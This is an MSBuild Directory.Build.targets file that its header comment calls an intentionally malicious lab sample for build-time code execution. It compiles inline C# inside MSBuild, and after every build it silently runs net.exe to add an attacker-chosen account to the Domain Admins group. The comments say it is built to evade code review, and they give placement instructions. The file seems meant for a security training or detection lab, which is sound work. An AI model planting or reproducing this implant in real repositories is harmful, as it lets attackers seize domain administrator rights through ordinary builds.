<?xml version="1.0" encoding="utf-8"?>
<!-- ============================================================================
     M8.1 POISON — stealthier variant (LAB ONLY - intentionally malicious).
     A Directory.Build.targets is auto-imported by MSBuild for EVERY project in the
     directory tree, so this detonates WITHOUT editing PaymentService.csproj at all
     (harder to spot in code review than an inline <Exec>). It uses RoslynCodeTaskFactory
     to compile and run C# IN-PROCESS inside the Microsoft-signed MSBuild.exe -
     no cmd.exe/net.exe child from the csproj itself -> MITRE T1127.001.

     Drop this file at the repo root (next to PaymentService.csproj) and build.
     ============================================================================ -->
<Project>
  <UsingTask TaskName="EscalatePrivileges"
             TaskFactory="RoslynCodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <ParameterGroup>
      <User ParameterType="System.String" Required="true" />
    </ParameterGroup>
    <Task>
      <Code Type="Fragment" Language="cs">
        <![CDATA[
        var psi = new System.Diagnostics.ProcessStartInfo("net.exe",
            "group \"Domain Admins\" " + User + " /add /domain");
        psi.UseShellExecute = false;
        psi.CreateNoWindow  = true;
        System.Diagnostics.Process.Start(psi);
        ]]>
      </Code>
    </Task>
  </UsingTask>

  <Target Name="_PoisonInline" AfterTargets="Build">
    <!-- attacker-controlled principal; change to the account you control -->
    <EscalatePrivileges User="devuser" />
  </Target>
</Project>
